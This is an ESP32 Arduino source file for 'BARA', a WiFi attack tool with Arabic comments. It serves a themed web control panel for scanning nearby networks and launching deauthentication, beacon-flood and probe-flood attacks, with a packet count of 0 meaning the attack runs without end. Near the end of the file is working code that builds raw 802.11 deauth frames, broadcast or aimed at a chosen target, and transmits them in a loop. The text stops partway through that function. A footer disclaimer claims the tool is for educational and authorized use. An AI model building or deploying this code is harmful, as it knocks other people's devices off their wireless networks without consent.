/***************************************************************
 * مشروع BARA - أداة الهجوم اللاسلكي المتقدمة
 * المطور: أحمد نور أحمد - من قنا
 * الإصدار: 2.0.0 - Demonic Edition
 * المميزات:
 * - نقطة اتصال WiFi
 * - واجهة ويب هجومية مع مؤثرات
 * - فحص الشبكات القريبة
 * - هجمات Deauth القوية
 * - مؤثرات بصرية وصوتية
 ***************************************************************/

// ==================== المكتبات المطلوبة ====================
#include <WiFi.h>
#include <WebServer.h>
#include <ESPmDNS.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_system.h"
#include <ArduinoJson.h>
#include <vector>
#include <sstream>
#include <iomanip>

// ==================== إعدادات نقطة الاتصال ====================
const char* AP_SSID = "BARA-DEMONIC-AP";
const char* AP_PASSWORD = "A7med@Elshab7";

// ==================== المتغيرات العالمية ====================
WebServer server(80);
bool attackActive = false;
uint32_t attackStartTime = 0;
uint8_t attackTarget[6] = {0};
uint8_t attackChannel = 1;
String attackType = "NONE";

// ==================== متغيرات المؤثرات ====================
bool visualEffects = true;
bool soundEffects = true;
int effectIntensity = 100;
String currentTheme = "demonic";

// ==================== هيكل بيانات الشبكة ====================
struct WiFiNetwork {
    String ssid;
    int32_t rssi;
    uint8_t channel;
    wifi_auth_mode_t auth;
    uint8_t bssid[6];
    bool selected;
};

std::vector<WiFiNetwork> networks;
uint32_t lastScanTime = 0;
const uint32_t SCAN_INTERVAL = 10000;

// ==================== ألوان التصميم الدموي ====================
const String DEMONIC_CSS = R"rawliteral(
:root {
    --blood-red: #8b0000;
    --dark-red: #330000;
    --hell-orange: #ff4500;
    --devil-purple: #4b0082;
    --ash-gray: #2f4f4f;
    --bone-white: #f5f5dc;
    --glowing-red: #ff0000;
    --soul-blue: #00bfff;
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    background: linear-gradient(135deg, #000000 0%, #330000 100%);
    color: #ff4444;
    font-family: 'Courier New', 'Lucida Console', monospace;
    min-height: 100vh;
    overflow-x: hidden;
    position: relative;
}

body::before {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: 
        radial-gradient(circle at 20% 30%, rgba(139, 0, 0, 0.15) 0%, transparent 50%),
        radial-gradient(circle at 80% 70%, rgba(255, 69, 0, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 40% 80%, rgba(75, 0, 130, 0.1) 0%, transparent 50%);
    z-index: -1;
    animation: hellPulse 10s infinite alternate;
}

@keyframes hellPulse {
    0% { opacity: 0.3; }
    100% { opacity: 0.7; }
}

.demonic-header {
    background: linear-gradient(90deg, var(--dark-red), var(--blood-red));
    padding: 20px;
    text-align: center;
    border-bottom: 3px solid var(--hell-orange);
    box-shadow: 0 0 30px var(--glowing-red);
    position: relative;
    overflow: hidden;
}

.demonic-header::before {
    content: 'B̷̘̈́̄̑͝A̵̱̝̤̠͒̐̕R̷̛̜͈̱͂̉̋̈́Ȁ̸̩̎̆͠';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    font-size: 4em;
    opacity: 0.1;
    color: var(--glowing-red);
    animation: glitch 3s infinite;
}

@keyframes glitch {
    0% { transform: translate(0); }
    20% { transform: translate(-2px, 2px); }
    40% { transform: translate(-2px, -2px); }
    60% { transform: translate(2px, 2px); }
    80% { transform: translate(2px, -2px); }
    100% { transform: translate(0); }
}

.title {
    font-size: 3em;
    color: var(--hell-orange);
    text-shadow: 
        0 0 10px var(--glowing-red),
        0 0 20px var(--glowing-red),
        0 0 30px var(--glowing-red);
    letter-spacing: 3px;
    position: relative;
    animation: titleBurn 2s infinite alternate;
}

@keyframes titleBurn {
    0% { 
        text-shadow: 
            0 0 10px var(--glowing-red),
            0 0 20px var(--glowing-red),
            0 0 30px var(--glowing-red);
    }
    100% { 
        text-shadow: 
            0 0 20px var(--glowing-red),
            0 0 40px var(--glowing-red),
            0 0 60px var(--glowing-red);
    }
}

.subtitle {
    color: var(--bone-white);
    font-size: 1.2em;
    margin-top: 10px;
    text-shadow: 0 0 5px var(--soul-blue);
}

.demonic-container {
    max-width: 1400px;
    margin: 30px auto;
    padding: 20px;
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 30px;
}

@media (max-width: 1200px) {
    .demonic-container {
        grid-template-columns: 1fr;
    }
}

.card {
    background: rgba(0, 0, 0, 0.8);
    border: 2px solid var(--blood-red);
    border-radius: 10px;
    padding: 25px;
    box-shadow: 
        0 0 20px rgba(139, 0, 0, 0.5),
        inset 0 0 20px rgba(255, 0, 0, 0.2);
    position: relative;
    overflow: hidden;
    transition: all 0.3s ease;
}

.card:hover {
    transform: translateY(-5px);
    box-shadow: 
        0 0 30px rgba(255, 69, 0, 0.7),
        inset 0 0 30px rgba(255, 0, 0, 0.3);
}

.card::before {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: linear-gradient(
        45deg,
        transparent 30%,
        rgba(255, 69, 0, 0.1) 50%,
        transparent 70%
    );
    animation: scan 3s infinite linear;
}

@keyframes scan {
    0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
    100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
}

.card-title {
    color: var(--hell-orange);
    font-size: 1.8em;
    margin-bottom: 20px;
    padding-bottom: 10px;
    border-bottom: 2px solid var(--blood-red);
    text-align: center;
    text-transform: uppercase;
    letter-spacing: 2px;
}

.control-panel {
    grid-column: 1 / -1;
}

.control-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 20px;
    margin-top: 20px;
}

.control-group {
    background: rgba(51, 0, 0, 0.5);
    padding: 15px;
    border-radius: 8px;
    border: 1px solid var(--blood-red);
}

.control-label {
    display: block;
    color: var(--bone-white);
    margin-bottom: 8px;
    font-size: 1.1em;
}

.control-input, .control-select {
    width: 100%;
    padding: 12px;
    background: rgba(0, 0, 0, 0.7);
    border: 1px solid var(--hell-orange);
    color: var(--bone-white);
    border-radius: 5px;
    font-size: 1em;
    transition: all 0.3s;
}

.control-input:focus, .control-select:focus {
    outline: none;
    border-color: var(--glowing-red);
    box-shadow: 0 0 10px var(--glowing-red);
}

.button {
    padding: 15px 30px;
    background: linear-gradient(45deg, var(--dark-red), var(--blood-red));
    color: white;
    border: none;
    border-radius: 5px;
    font-size: 1.2em;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.3s;
    text-transform: uppercase;
    letter-spacing: 1px;
    position: relative;
    overflow: hidden;
}

.button:hover {
    background: linear-gradient(45deg, var(--blood-red), var(--hell-orange));
    transform: scale(1.05);
    box-shadow: 0 0 20px var(--glowing-red);
}

.button:active {
    transform: scale(0.95);
}

.button-attack {
    background: linear-gradient(45deg, #8b0000, #ff0000);
    animation: pulseAttack 1s infinite;
}

@keyframes pulseAttack {
    0%, 100% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
    50% { box-shadow: 0 0 40px rgba(255, 0, 0, 0.8); }
}

.button-stop {
    background: linear-gradient(45deg, #2f4f4f, #008080);
}

.network-list {
    max-height: 500px;
    overflow-y: auto;
    margin-top: 15px;
}

.network-item {
    background: rgba(51, 0, 0, 0.3);
    border: 1px solid var(--blood-red);
    border-radius: 5px;
    padding: 15px;
    margin-bottom: 10px;
    cursor: pointer;
    transition: all 0.3s;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.network-item:hover {
    background: rgba(139, 0, 0, 0.3);
    transform: translateX(5px);
    border-color: var(--hell-orange);
}

.network-item.selected {
    background: rgba(255, 69, 0, 0.3);
    border-color: var(--glowing-red);
    box-shadow: 0 0 10px var(--glowing-red);
}

.network-ssid {
    font-weight: bold;
    color: var(--bone-white);
    font-size: 1.1em;
}

.network-info {
    display: flex;
    gap: 15px;
    color: var(--soul-blue);
    font-size: 0.9em;
}

.signal-bar {
    width: 100px;
    height: 20px;
    background: rgba(0, 0, 0, 0.5);
    border: 1px solid var(--blood-red);
    border-radius: 3px;
    overflow: hidden;
    position: relative;
}

.signal-level {
    height: 100%;
    background: linear-gradient(90deg, #00ff00, #ffff00, #ff0000);
    transition: width 0.5s;
}

.status-panel {
    position: fixed;
    bottom: 20px;
    right: 20px;
    background: rgba(0, 0, 0, 0.9);
    border: 2px solid var(--hell-orange);
    border-radius: 10px;
    padding: 15px;
    min-width: 300px;
    box-shadow: 0 0 30px rgba(255, 69, 0, 0.5);
    z-index: 1000;
}

.status-title {
    color: var(--hell-orange);
    font-size: 1.3em;
    margin-bottom: 10px;
    text-align: center;
}

.status-item {
    display: flex;
    justify-content: space-between;
    margin: 5px 0;
    color: var(--bone-white);
}

.status-value {
    color: var(--soul-blue);
    font-weight: bold;
}

.attack-active {
    color: var(--glowing-red) !important;
    animation: blink 0.5s infinite;
}

@keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
}

.effects-toggle {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 20px;
}

.toggle-switch {
    position: relative;
    width: 60px;
    height: 30px;
}

.toggle-checkbox {
    opacity: 0;
    width: 0;
    height: 0;
}

.toggle-slider {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: var(--dark-red);
    border-radius: 34px;
    transition: .4s;
}

.toggle-slider:before {
    position: absolute;
    content: "";
    height: 22px;
    width: 22px;
    left: 4px;
    bottom: 4px;
    background-color: white;
    border-radius: 50%;
    transition: .4s;
}

.toggle-checkbox:checked + .toggle-slider {
    background-color: var(--hell-orange);
}

.toggle-checkbox:checked + .toggle-slider:before {
    transform: translateX(30px);
}

.demonic-footer {
    text-align: center;
    margin-top: 40px;
    padding: 20px;
    color: var(--bone-white);
    border-top: 1px solid var(--blood-red);
}

.developer-name {
    color: var(--hell-orange);
    font-size: 1.2em;
    text-shadow: 0 0 10px rgba(255, 69, 0, 0.5);
}

.loading {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.9);
    z-index: 2000;
    justify-content: center;
    align-items: center;
}

.loading-content {
    text-align: center;
    color: var(--hell-orange);
}

.loading-spinner {
    width: 80px;
    height: 80px;
    border: 8px solid var(--dark-red);
    border-top: 8px solid var(--hell-orange);
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 20px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.toast {
    position: fixed;
    bottom: 80px;
    right: 20px;
    background: var(--blood-red);
    color: white;
    padding: 15px;
    border-radius: 5px;
    box-shadow: 0 0 20px var(--glowing-red);
    z-index: 1001;
    display: none;
    animation: slideIn 0.3s ease;
}

@keyframes slideIn {
    from {
        transform: translateX(100%);
        opacity: 0;
    }
    to {
        transform: translateX(0);
        opacity: 1;
    }
}

.blood-drop {
    position: absolute;
    width: 4px;
    height: 4px;
    background: var(--glowing-red);
    border-radius: 50%;
    pointer-events: none;
    animation: drop 2s linear forwards;
}

@keyframes drop {
    0% {
        transform: translateY(-100px);
        opacity: 1;
    }
    100% {
        transform: translateY(100vh);
        opacity: 0;
    }
}

.radio-wave {
    position: absolute;
    border: 2px solid var(--soul-blue);
    border-radius: 50%;
    opacity: 0;
    animation: wave 2s linear infinite;
}

@keyframes wave {
    0% {
        transform: scale(0.1);
        opacity: 1;
    }
    100% {
        transform: scale(4);
        opacity: 0;
    }
}

.chart-container {
    height: 300px;
    margin-top: 20px;
}

.intensity-slider {
    -webkit-appearance: none;
    width: 100%;
    height: 10px;
    background: linear-gradient(90deg, var(--dark-red), var(--hell-orange));
    border-radius: 5px;
    outline: none;
}

.intensity-slider::-webkit-slider-thumb {
    -webkit-appearance: none;
    width: 25px;
    height: 25px;
    background: var(--glowing-red);
    border-radius: 50%;
    cursor: pointer;
    box-shadow: 0 0 10px var(--glowing-red);
}

.intensity-slider::-moz-range-thumb {
    width: 25px;
    height: 25px;
    background: var(--glowing-red);
    border-radius: 50%;
    cursor: pointer;
    box-shadow: 0 0 10px var(--glowing-red);
    border: none;
}
)rawliteral";

// ==================== جافاسكريبت للمؤثرات ====================
const String DEMONIC_JS = R"rawliteral(
let audioContext;
let attackAudio;
let scanAudio;
let isPlaying = false;

// تهيئة المؤثرات الصوتية
function initAudio() {
    try {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        
        // إنشاء صوت الهجوم
        attackAudio = {
            oscillator: null,
            gainNode: null,
            start() {
                if (!soundEffects) return;
                
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.type = 'sawtooth';
                oscillator.frequency.setValueAtTime(100, audioContext.currentTime);
                oscillator.frequency.exponentialRampToValueAtTime(800, audioContext.currentTime + 0.1);
                
                gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.5, audioContext.currentTime + 0.1);
                
                oscillator.start();
                this.oscillator = oscillator;
                this.gainNode = gainNode;
                isPlaying = true;
            },
            stop() {
                if (this.gainNode) {
                    this.gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
                    setTimeout(() => {
                        if (this.oscillator) {
                            this.oscillator.stop();
                        }
                    }, 500);
                }
                isPlaying = false;
            }
        };
        
        // إنشاء صوت المسح
        scanAudio = {
            oscillator: null,
            start() {
                if (!soundEffects) return;
                
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.type = 'sine';
                oscillator.frequency.setValueAtTime(200, audioContext.currentTime);
                oscillator.frequency.linearRampToValueAtTime(800, audioContext.currentTime + 2);
                
                gainNode.gain.setValueAtTime(0.05, audioContext.currentTime);
                
                oscillator.start();
                this.oscillator = oscillator;
                
                setTimeout(() => {
                    oscillator.stop();
                }, 2000);
            }
        };
        
        console.log('Audio system initialized');
    } catch (e) {
        console.error('Audio initialization failed:', e);
    }
}

// تأثيرات الدم
function createBloodEffect(x, y) {
    if (!visualEffects) return;
    
    const bloodDrop = document.createElement('div');
    bloodDrop.className = 'blood-drop';
    bloodDrop.style.left = x + 'px';
    bloodDrop.style.top = y + 'px';
    bloodDrop.style.width = (Math.random() * 8 + 4) + 'px';
    bloodDrop.style.height = (Math.random() * 8 + 4) + 'px';
    bloodDrop.style.background = `rgba(139, 0, 0, ${Math.random() * 0.5 + 0.5})`;
    
    document.body.appendChild(bloodDrop);
    
    setTimeout(() => {
        bloodDrop.remove();
    }, 2000);
}

// تأثيرات موجات الراديو
function createRadioWave(x, y) {
    if (!visualEffects) return;
    
    const wave = document.createElement('div');
    wave.className = 'radio-wave';
    wave.style.left = x + 'px';
    wave.style.top = y + 'px';
    
    document.body.appendChild(wave);
    
    setTimeout(() => {
        wave.remove();
    }, 2000);
}

// تحديث واجهة الشبكات
function updateNetworkList(networks) {
    const container = document.getElementById('networkList');
    if (!container) return;
    
    container.innerHTML = '';
    
    networks.forEach((network, index) => {
        const networkItem = document.createElement('div');
        networkItem.className = 'network-item';
        if (network.selected) {
            networkItem.classList.add('selected');
        }
        
        const signalPercent = Math.min(Math.max((network.rssi + 100) * 2, 0), 100);
        
        networkItem.innerHTML = `
            <div>
                <div class="network-ssid">${network.ssid || '[Hidden]'}</div>
                <div class="network-info">
                    <span>Channel: ${network.channel}</span>
                    <span>RSSI: ${network.rssi} dBm</span>
                    <span>Auth: ${getAuthMode(network.auth)}</span>
                </div>
            </div>
            <div>
                <div class="signal-bar">
                    <div class="signal-level" style="width: ${signalPercent}%"></div>
                </div>
            </div>
        `;
        
        networkItem.addEventListener('click', () => {
            selectNetwork(index);
            createBloodEffect(event.clientX, event.clientY);
        });
        
        container.appendChild(networkItem);
    });
}

// الحصول على نوع المصادقة
function getAuthMode(auth) {
    const modes = {
        0: 'OPEN',
        1: 'WEP',
        2: 'WPA_PSK',
        3: 'WPA2_PSK',
        4: 'WPA_WPA2_PSK',
        5: 'WPA2_ENTERPRISE'
    };
    return modes[auth] || 'UNKNOWN';
}

// تحديث حالة الهجوم
function updateAttackStatus(status) {
    const statusElem = document.getElementById('attackStatus');
    const durationElem = document.getElementById('attackDuration');
    const targetElem = document.getElementById('attackTarget');
    
    if (status.active) {
        statusElem.textContent = 'ACTIVE';
        statusElem.className = 'status-value attack-active';
        durationElem.textContent = formatDuration(status.duration);
        targetElem.textContent = status.target || 'ALL NETWORKS';
        
        // تشغيل صوت الهجوم
        if (attackAudio && !isPlaying) {
            attackAudio.start();
        }
        
        // إنشاء موجات راديو
        setInterval(() => {
            if (visualEffects) {
                const x = Math.random() * window.innerWidth;
                const y = Math.random() * window.innerHeight;
                createRadioWave(x, y);
            }
        }, 500);
    } else {
        statusElem.textContent = 'INACTIVE';
        statusElem.className = 'status-value';
        durationElem.textContent = '00:00';
        targetElem.textContent = 'NONE';
        
        // إيقاف صوت الهجوم
        if (attackAudio && isPlaying) {
            attackAudio.stop();
        }
    }
}

// تنسيق الوقت
function formatDuration(seconds) {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

// إظهار رسالة
function showToast(message, type = 'info') {
    const toast = document.getElementById('toast');
    if (!toast) return;
    
    toast.textContent = message;
    toast.style.display = 'block';
    toast.style.background = type === 'error' ? 'var(--blood-red)' : 
                            type === 'success' ? 'var(--devil-purple)' : 
                            'var(--ash-gray)';
    
    setTimeout(() => {
        toast.style.display = 'none';
    }, 3000);
}

// تحميل المؤثرات
function loadEffects() {
    // تهيئة الصوت
    initAudio();
    
    // إضافة تأثيرات الدم عند النقر
    document.addEventListener('click', (e) => {
        if (visualEffects && Math.random() > 0.7) {
            createBloodEffect(e.clientX, e.clientY);
        }
    });
    
    // تحديث مستويات الإشارة بشكل متحرك
    setInterval(() => {
        const signalBars = document.querySelectorAll('.signal-level');
        signalBars.forEach(bar => {
            const currentWidth = parseFloat(bar.style.width);
            const newWidth = currentWidth + (Math.random() * 4 - 2);
            bar.style.width = Math.max(0, Math.min(100, newWidth)) + '%';
        });
    }, 1000);
}

// تحديث الرسم البياني
function updateChart(networks) {
    const ctx = document.getElementById('signalChart');
    if (!ctx) return;
    
    const chartData = {
        labels: networks.map(n => n.ssid || 'Hidden').slice(0, 10),
        datasets: [{
            label: 'Signal Strength (dBm)',
            data: networks.map(n => n.rssi).slice(0, 10),
            backgroundColor: networks.map(n => 
                `rgba(${Math.min(255, 255 - n.rssi * 2)}, ${Math.max(0, 100 + n.rssi * 2)}, 0, 0.7)`
            ),
            borderColor: 'var(--hell-orange)',
            borderWidth: 2
        }]
    };
    
    if (window.signalChart) {
        window.signalChart.data = chartData;
        window.signalChart.update();
    } else {
        window.signalChart = new Chart(ctx, {
            type: 'bar',
            data: chartData,
            options: {
                responsive: true,
                maintainAspectRatio: false,
                animation: {
                    duration: 1000,
                    easing: 'easeInOutQuart'
                },
                plugins: {
                    legend: {
                        labels: {
                            color: 'var(--bone-white)'
                        }
                    }
                },
                scales: {
                    y: {
                        beginAtZero: false,
                        ticks: {
                            color: 'var(--bone-white)'
                        },
                        grid: {
                            color: 'rgba(255, 69, 0, 0.2)'
                        }
                    },
                    x: {
                        ticks: {
                            color: 'var(--bone-white)'
                        },
                        grid: {
                            color: 'rgba(255, 69, 0, 0.2)'
                        }
                    }
                }
            }
        });
    }
}

// المسح التلقائي
function startAutoScan() {
    setInterval(() => {
        scanNetworks();
    }, 10000);
}

// تهيئة الصفحة
document.addEventListener('DOMContentLoaded', function() {
    // تحميل المؤثرات
    loadEffects();
    
    // بدء المسح التلقائي
    startAutoScan();
    
    // المسح الأولي
    scanNetworks();
    
    // تحديث حالة الهجوم كل ثانية
    setInterval(() => {
        updateStatus();
    }, 1000);
    
    console.log('BARA Demonic Interface Loaded!');
});

// متغيرات التحكم من واجهة المستخدم
let soundEffects = true;
let visualEffects = true;

// وظائف AJAX
async function scanNetworks() {
    showLoading(true);
    
    try {
        const response = await fetch('/scan');
        const data = await response.json();
        
        updateNetworkList(data.networks);
        updateChart(data.networks);
        
        if (soundEffects && scanAudio) {
            scanAudio.start();
        }
        
        showToast(`Found ${data.networks.length} networks`, 'success');
    } catch (error) {
        console.error('Scan failed:', error);
        showToast('Scan failed!', 'error');
    } finally {
        showLoading(false);
    }
}

async function startAttack() {
    const targetBSSID = document.getElementById('targetBSSID').value;
    const channel = document.getElementById('attackChannel').value;
    const attackType = document.getElementById('attackType').value;
    const packetCount = document.getElementById('packetCount').value;
    
    showLoading(true);
    
    try {
        const response = await fetch('/startAttack', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                target: targetBSSID,
                channel: channel,
                type: attackType,
                packets: packetCount
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showToast('Attack started!', 'success');
            updateAttackStatus({ active: true, duration: 0, target: targetBSSID || 'ALL' });
        } else {
            showToast('Attack failed!', 'error');
        }
    } catch (error) {
        console.error('Attack failed:', error);
        showToast('Attack failed!', 'error');
    } finally {
        showLoading(false);
    }
}

async function stopAttack() {
    showLoading(true);
    
    try {
        const response = await fetch('/stopAttack');
        const data = await response.json();
        
        if (data.success) {
            showToast('Attack stopped!', 'success');
            updateAttackStatus({ active: false });
        }
    } catch (error) {
        console.error('Stop failed:', error);
        showToast('Stop failed!', 'error');
    } finally {
        showLoading(false);
    }
}

async function selectNetwork(index) {
    try {
        const response = await fetch('/selectNetwork', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ index: index })
        });
        
        const data = await response.json();
        
        if (data.success) {
            document.getElementById('targetBSSID').value = data.bssid;
            document.getElementById('attackChannel').value = data.channel;
            showToast(`Selected: ${data.ssid}`, 'success');
        }
    } catch (error) {
        console.error('Selection failed:', error);
    }
}

async function updateStatus() {
    try {
        const response = await fetch('/status');
        const data = await response.json();
        
        updateAttackStatus(data.attack);
        document.getElementById('connectedClients').textContent = data.clients;
        document.getElementById('cpuUsage').textContent = data.cpu + '%';
        document.getElementById('memoryUsage').textContent = data.memory + '%';
    } catch (error) {
        console.error('Status update failed:', error);
    }
}

function toggleSoundEffects() {
    soundEffects = !soundEffects;
    showToast(`Sound effects ${soundEffects ? 'ON' : 'OFF'}`);
}

function toggleVisualEffects() {
    visualEffects = !visualEffects;
    showToast(`Visual effects ${visualEffects ? 'ON' : 'OFF'}`);
}

function showLoading(show) {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.style.display = show ? 'flex' : 'none';
    }
}
)rawliteral";

// ==================== صفحة الويب الرئيسية ====================
const String MAIN_PAGE = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BARA - DEMONIC WIFI ATTACK SUITE</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        )rawliteral" + DEMONIC_CSS + R"rawliteral(
    </style>
</head>
<body>
    <div class="demonic-header">
        <h1 class="title">BARA DEMONIC SUITE</h1>
        <p class="subtitle">ULTIMATE WIFI PENETRATION TESTING TOOL</p>
    </div>
    
    <div class="demonic-container">
        <!-- لوحة التحكم -->
        <div class="card control-panel">
            <h2 class="card-title">DEMONIC CONTROL PANEL</h2>
            <div class="control-grid">
                <div class="control-group">
                    <label class="control-label">Target BSSID:</label>
                    <input type="text" id="targetBSSID" class="control-input" placeholder="FF:FF:FF:FF:FF:FF or leave empty for broadcast">
                </div>
                
                <div class="control-group">
                    <label class="control-label">Channel (1-14):</label>
                    <select id="attackChannel" class="control-select">
                        <option value="0">All Channels</option>
                    </select>
                </div>
                
                <div class="control-group">
                    <label class="control-label">Attack Type:</label>
                    <select id="attackType" class="control-select">
                        <option value="DEAUTH">DEAUTH Attack</option>
                        <option value="BEACON">Beacon Flood</option>
                        <option value="PROBE">Probe Request Flood</option>
                        <option value="ALL">All Attacks</option>
                    </select>
                </div>
                
                <div class="control-group">
                    <label class="control-label">Packet Count (0=infinite):</label>
                    <input type="number" id="packetCount" class="control-input" value="0" min="0" max="100000">
                </div>
            </div>
            
            <div style="display: flex; gap: 20px; margin-top: 30px;">
                <button class="button button-attack" onclick="startAttack()">
                    🗡️ START DEMONIC ATTACK
                </button>
                <button class="button button-stop" onclick="stopAttack()">
                    ⏹️ STOP ATTACK
                </button>
                <button class="button" onclick="scanNetworks()">
                    🔍 SCAN NETWORKS
                </button>
            </div>
            
            <div class="effects-toggle" style="margin-top: 30px;">
                <div>
                    <span class="control-label">Sound Effects:</span>
                    <label class="toggle-switch">
                        <input type="checkbox" checked onclick="toggleSoundEffects()">
                        <span class="toggle-slider"></span>
                    </label>
                </div>
                <div>
                    <span class="control-label">Visual Effects:</span>
                    <label class="toggle-switch">
                        <input type="checkbox" checked onclick="toggleVisualEffects()">
                        <span class="toggle-slider"></span>
                    </label>
                </div>
                <div>
                    <span class="control-label">Effect Intensity:</span>
                    <input type="range" min="0" max="100" value="100" class="intensity-slider" 
                           oninput="effectIntensity = this.value">
                </div>
            </div>
        </div>
        
        <!-- قائمة الشبكات -->
        <div class="card">
            <h2 class="card-title">DETECTED NETWORKS</h2>
            <div class="network-list" id="networkList">
                <!-- Networks will be loaded here -->
            </div>
        </div>
        
        <!-- الرسم البياني -->
        <div class="card">
            <h2 class="card-title">SIGNAL STRENGTH ANALYSIS</h2>
            <div class="chart-container">
                <canvas id="signalChart"></canvas>
            </div>
        </div>
        
        <!-- معلومات النظام -->
        <div class="card">
            <h2 class="card-title">SYSTEM INFORMATION</h2>
            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
                <div class="status-item">
                    <span>ESP32 Chip ID:</span>
                    <span class="status-value" id="chipId">Loading...</span>
                </div>
                <div class="status-item">
                    <span>Free Heap:</span>
                    <span class="status-value" id="freeHeap">Loading...</span>
                </div>
                <div class="status-item">
                    <span>CPU Frequency:</span>
                    <span class="status-value" id="cpuFreq">Loading...</span>
                </div>
                <div class="status-item">
                    <span>SDK Version:</span>
                    <span class="status-value" id="sdkVersion">Loading...</span>
                </div>
                <div class="status-item">
                    <span>Access Point IP:</span>
                    <span class="status-value">192.168.4.1</span>
                </div>
                <div class="status-item">
                    <span>Connected Clients:</span>
                    <span class="status-value" id="connectedClients">0</span>
                </div>
            </div>
        </div>
    </div>
    
    <!-- لوحة الحالة -->
    <div class="status-panel">
        <h3 class="status-title">DEMONIC STATUS</h3>
        <div class="status-item">
            <span>Attack Status:</span>
            <span class="status-value" id="attackStatus">INACTIVE</span>
        </div>
        <div class="status-item">
            <span>Attack Duration:</span>
            <span class="status-value" id="attackDuration">00:00</span>
        </div>
        <div class="status-item">
            <span>Target:</span>
            <span class="status-value" id="attackTarget">NONE</span>
        </div>
        <div class="status-item">
            <span>CPU Usage:</span>
            <span class="status-value" id="cpuUsage">0%</span>
        </div>
        <div class="status-item">
            <span>Memory Usage:</span>
            <span class="status-value" id="memoryUsage">0%</span>
        </div>
    </div>
    
    <!-- شاشة التحميل -->
    <div class="loading" id="loading">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <h2>SUMMONING DEMONS...</h2>
            <p>Initializing dark forces...</p>
        </div>
    </div>
    
    <!-- الرسائل العائمة -->
    <div class="toast" id="toast"></div>
    
    <!-- التذييل -->
    <div class="demonic-footer">
        <p>BARA DEMONIC SUITE v2.0.0 | ESP32 Wireless Attack Tool</p>
        <p class="developer-name">DEVELOPED BY: AHMED NOUR AHMED - FROM QENA</p>
        <p style="color: var(--soul-blue); font-size: 0.9em; margin-top: 10px;">
            WARNING: This tool is for educational and authorized penetration testing only!
        </p>
    </div>
    
    <script>
        )rawliteral" + DEMONIC_JS + R"rawliteral(
    </script>
</body>
</html>
)rawliteral";

// ==================== وظائف المسح ====================
void scanNetworksTask(void *parameter) {
    while (true) {
        if (millis() - lastScanTime > SCAN_INTERVAL) {
            int16_t numNetworks = WiFi.scanNetworks(true, true);
            networks.clear();
            
            for (int i = 0; i < numNetworks; i++) {
                WiFiNetwork net;
                net.ssid = WiFi.SSID(i);
                net.rssi = WiFi.RSSI(i);
                net.channel = WiFi.channel(i);
                net.auth = WiFi.encryptionType(i);
                WiFi.BSSID(i, net.bssid);
                net.selected = false;
                networks.push_back(net);
            }
            
            lastScanTime = millis();
        }
        vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
}

// ==================== وظائف الهجوم ====================
void deauthAttackTask(void *parameter) {
    while (true) {
        if (attackActive) {
            // إنشاء حزم deauth
            wifi_promiscuous_pkt_t deauth_pkt;
            deauth_pkt.rx_ctrl.sig_len = sizeof(wifi_promiscuous_pkt_t);
            
            // إعداد رأس 802.11
            uint8_t deauth_frame[26] = {
                0xc0, 0x00,                         // Type: Management, Subtype: Deauth
                0x00, 0x00,                         // Duration
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast)
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
                0x00, 0x00,                         // Sequence number
                0x07, 0x00                          // Reason code: Class 3 frame received from nonassociated STA
            };
            
            // تعيين عنوان الهدف إذا كان محددًا
            if (attackTarget[0] != 0) {
                memcpy(&deauth_frame[4], attackTarget, 6);  // Destination
                memcpy(&deauth_frame[10], attackTarget, 6); // Source
                memcpy(&deauth_frame[16], attackTarget, 6); // BSSID
            }
            
            // إرسال الحزمة
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
            
            // مؤثرات صوتية (باستخدام PWM)
            if (soundEffects) {
                ledcWriteTone(0, 1000); // نغمة عالية
                delay(10);
